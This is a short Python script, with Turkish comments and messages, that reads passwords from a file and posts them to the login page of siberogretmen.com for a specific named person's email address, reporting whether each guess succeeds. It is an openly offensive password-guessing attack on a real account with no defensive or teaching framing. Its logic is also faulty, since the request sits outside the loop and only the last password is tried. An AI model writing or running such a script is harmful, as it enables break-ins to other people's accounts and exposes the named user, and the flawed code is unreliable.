import requests
import time

with open("sifreler2.txt") as sifre:
    for satir in sifre:
        print(satir)

payload={"log":"nesrin.atikturk@gmail.com" , "pwd":satir}
r=requests.post("https://www.siberogretmen.com/giris/?redirect_to=https%3A%2F%2Fwww.siberogretmen.com%2F", data=payload)
time.sleep(5)

#print(r.text)

if "Incorrect password" in r.text:
    print("Şifre doğru değil")

else:
    print("Şifre doğru")